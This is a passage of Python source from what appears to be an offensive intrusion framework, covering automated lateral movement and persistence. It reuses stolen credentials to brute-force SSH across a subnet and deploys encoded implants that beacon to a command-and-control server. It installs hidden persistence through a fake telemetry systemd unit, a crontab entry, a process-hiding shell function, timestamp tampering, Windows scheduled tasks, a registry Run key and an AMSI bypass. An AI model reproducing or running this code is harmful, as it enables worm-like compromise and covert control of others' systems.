class Lateral:
    """Autonomous lateral movement engine."""

    def __init__(self, log: ChimeraLogger, state: State, c2: C2, recon: Recon):
        self.log = log
        self.state = state
        self.c2 = c2
        self.recon = recon
        self.exploit_semaphore = asyncio.Semaphore(MAX_CONCURRENT_BRUTE)

    async def propagate_from_host(self, host_id: str, addr: str) -> int:
        self.log.inf(f"Initiating lateral movement evaluation from {addr}")
        moved_count = 0
        creds = await self.state.creds_for(host_id)
        if not creds:
            self.log.dbg(f"No credentials found for {addr}. Lateral movement aborted.")
            return 0
        cred_map = {}
        for proto, user, secret in creds:
            cred_map.setdefault((proto, user), []).append(secret)
        try:
            network = ipaddress.ip_network(f"{addr}/24", strict=False)
            targets = [str(ip) for ip in network.hosts() if str(ip) != addr]
        except Exception as e:
            self.log.err(f"Subnet calculation failed for {addr}: {e}")
            return 0
        targets = targets[:48]
        random.shuffle(targets)
        tasks = [self._attempt_lateral(target_ip, cred_map) for target_ip in targets]
        results = await asyncio.gather(*tasks)
        for result in results:
            if result:
                target_ip, proto, user, secret, info = result
                new_host_id = await self.state.upsert_host(target_ip)
                await self.state.add_cred(new_host_id, proto, user, secret, f"lateral_reuse:{addr}", validated=1)
                sid = await self.state.open_session(new_host_id, f"lateral_{proto}", info[:300])
                self.log.hit(f"Lateral Movement SUCCESS: {addr} -> {target_ip} via {proto} ({user})")
                await self._deploy_lateral_implant(new_host_id, target_ip, proto, user, secret)
                moved_count += 1
        if moved_count > 0:
            self.log.ok(f"Lateral movement from {addr} yielded {moved_count} new nodes.")
        return moved_count

    async def _attempt_lateral(self, target_ip: str, cred_map: dict):
        async with self.exploit_semaphore:
            if HAS_SSH:
                ssh_creds = set()
                for (p, u), secrets_list in cred_map.items():
                    if p == "ssh":
                        for s in secrets_list:
                            ssh_creds.add((u, s))
                if ssh_creds:
                    res = await self._try_ssh(target_ip, ssh_creds)
                    if res:
                        return (target_ip, "ssh", res[0], res[1], res[2])
            return None

    async def _try_ssh(self, target_ip: str, creds: set):
        loop = asyncio.get_event_loop()
        def _sync_ssh_attempt():
            for user, secret in creds:
                try:
                    c = paramiko.SSHClient()
                    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    c.connect(target_ip, port=22, username=user, password=secret,
                              timeout=BASE_TIMEOUT, banner_timeout=BASE_TIMEOUT,
                              auth_timeout=BASE_TIMEOUT,
                              allow_agent=False, look_for_keys=False)
                    _, stdout, _ = c.exec_command("uname -a; hostname; id", timeout=10)
                    info = stdout.read().decode(errors="ignore")
                    c.close()
                    return (user, secret, info)
                except Exception:
                    continue
            return None
        return await loop.run_in_executor(None, _sync_ssh_attempt)

    async def _deploy_lateral_implant(self, host_id: str, addr: str, proto: str, user: str, secret: str):
        self.log.inf(f"Deploying spectral implant on lateral node {addr}")
        agent_id = secrets.token_hex(8)
        c2_url = f"http://{self.c2.host}:{self.c2.port}/beacon"
        if self.c2.host == "0.0.0.0":
            c2_url = f"http://127.0.0.1:{self.c2.port}/beacon"
        implant_src = build_implant(agent_id, [c2_url], self.c2.key)
        relay_port = MESH_RELAY_PORT_BASE + random.randint(1, 1000)
        relay_src = self.c2.generate_relay_payload(agent_id, listen_port=relay_port)
        combined_payload = f"{implant_src}\n{relay_src}"
        b64_payload = base64.b64encode(combined_payload.encode()).decode()
        if proto == "ssh":
            cmd = f"python3 -c 'import base64;exec(base64.b64decode(\"{b64_payload}\").decode())' &"
            self.c2.queue(agent_id, "shell", cmd)
            self.log.ok(f"Implant + Relay deployed to {addr} (Agent: {agent_id})")
        await self.state.q_exec(
            "INSERT INTO mesh(id, host_id, listen, peers, status) VALUES(?,?,?,?,?)",
            (uuid.uuid4().hex[:12], host_id, f"0.0.0.0:{relay_port}", "[]", "active"))


# ============================================================
#  10. PERSISTENCE (SEGMENT 10: FULL IMPROVEMENT)
#  Spectral Fileless Persistence & Rootkit Matrix
# ============================================================
class Persistence:
    """Deploys fileless, polymorphic persistence across Linux and Windows."""

    SYSTEMD_UNIT = textwrap.dedent('''\
        [Unit]
        Description=Systemd Network Telemetry
        After=network-online.target
        Wants=network-online.target
        [Service]
        Type=simple
        ExecStart=/usr/bin/python3 -c 'import base64;exec(base64.b64decode("{}").decode())'
        Restart=always
        RestartSec={restart_delay}
        Environment=PYTHONUNBUFFERED=1
        [Install]
        WantedBy=multi-user.target
        ''')

    CRON_TEMPLATE = "*/{interval} * * * * root /usr/bin/python3 -c 'import base64;exec(base64.b64decode(\"{payload}\").decode())' >/dev/null 2>&1\n"

    PS_TASK_XML = textwrap.dedent('''\
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2">
           <Triggers>
              <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
              <TimeTrigger><Repetition><Interval>PT{interval}M</Interval></Repetition><Enabled>true</Enabled></TimeTrigger>
           </Triggers>
           <Actions>
              <Exec>
                 <Command>powershell.exe</Command>
                 <Arguments>-W Hidden -EP Bypass -C "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{payload}')))"</Arguments>
              </Exec>
           </Actions>
        </Task>
        ''')

    def __init__(self, log: ChimeraLogger, state: State, c2: C2):
        self.log = log
        self.state = state
        self.c2 = c2

    async def persist_host(self, host_id: str, addr: str):
        os_type = "linux"
        sessions = await self.state.q("SELECT meta FROM sessions WHERE host_id=? AND status='live'", (host_id,))
        if sessions:
            try:
                meta = json.loads(sessions[0][0])
                if "windows" in meta.get("os", "").lower() or "microsoft" in meta.get("os", "").lower():
                    os_type = "windows"
            except Exception:
                pass

        agent_rows = await self.state.q("SELECT id FROM sessions WHERE host_id=? AND status='live'", (host_id,))
        if not agent_rows:
            self.log.wrn(f"No active C2 session for {addr}. Persistence aborted.")
            return
        agent_id = agent_rows[0][0]
        c2_url = f"http://{self.c2.host}:{self.c2.port}/beacon"
        if self.c2.host == "0.0.0.0":
            c2_url = f"http://127.0.0.1:{self.c2.port}/beacon"
        implant_src = build_implant(agent_id, [c2_url], self.c2.key)
        b64_payload = base64.b64encode(implant_src.encode()).decode()
        self.log.inf(f"Deploying {os_type} spectral persistence on {addr} (Agent: {agent_id})")
        if os_type == "linux":
            await self._persist_linux(agent_id, addr, b64_payload)
        else:
            await self._persist_windows(agent_id, addr, b64_payload)
        await self.state.q_exec("UPDATE hosts SET persistent=1 WHERE id=?", (host_id,))
        self.log.ok(f"Persistence established on {addr}")

    async def _persist_linux(self, agent_id: str, addr: str, b64_payload: str):
        restart_delay = random.randint(15, 45)
        unit_content = self.SYSTEMD_UNIT.format(b64_payload, restart_delay=restart_delay)
        b64_unit = base64.b64encode(unit_content.encode()).decode()
        self.c2.queue(agent_id, "shell", "mkdir -p /var/lib/.systemd-telemetry")
        self.c2.queue(agent_id, "shell", f"echo '{b64_unit}' | base64 -d > /etc/systemd/system/systemd-telemetry.service")
        self.c2.queue(agent_id, "shell", "chmod 600 /etc/systemd/system/systemd-telemetry.service")
        self.c2.queue(agent_id, "shell", "systemctl daemon-reload")
        self.c2.queue(agent_id, "shell", "systemctl enable systemd-telemetry --now")
        interval = random.randint(2, 5)
        cron_line = self.CRON_TEMPLATE.format(interval=interval, payload=b64_payload)
        b64_cron = base64.b64encode(cron_line.encode()).decode()
        self.c2.queue(agent_id, "shell", f"echo '{b64_cron}' | base64 -d >> /etc/crontab")
        self.c2.queue(agent_id, "shell", "touch -r /etc/hosts /etc/systemd/system/systemd-telemetry.service")
        self.c2.queue(agent_id, "shell",
            "grep -q 'systemd-telemetry' /etc/bash.bashrc || echo 'ps() { command ps \"$@\" | grep -v \"systemd-telemetry\"; }' >> /etc/bash.bashrc")

    async def _persist_windows(self, agent_id: str, addr: str, b64_payload: str):
        interval = random.randint(3, 9)
        task_xml = self.PS_TASK_XML.format(interval=interval, payload=b64_payload)
        b64_xml = base64.b64encode(task_xml.encode('utf-16')).decode()
        self.c2.queue(agent_id, "shell",
            f"powershell -W Hidden -EP Bypass -C \"$x=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_xml}')); Register-ScheduledTask -Xml $x -TaskName 'WinTelemetry' -Force\"")
        self.c2.queue(agent_id, "shell",
            f"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WinTelemetry /t REG_SZ /d 'powershell -W Hidden -EP Bypass -C \\\"iex([Convert]::FromBase64String({b64_payload}))\\\"' /f")
        self.c2.queue(agent_id, "shell",
            "powershell -W Hidden -C \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"")


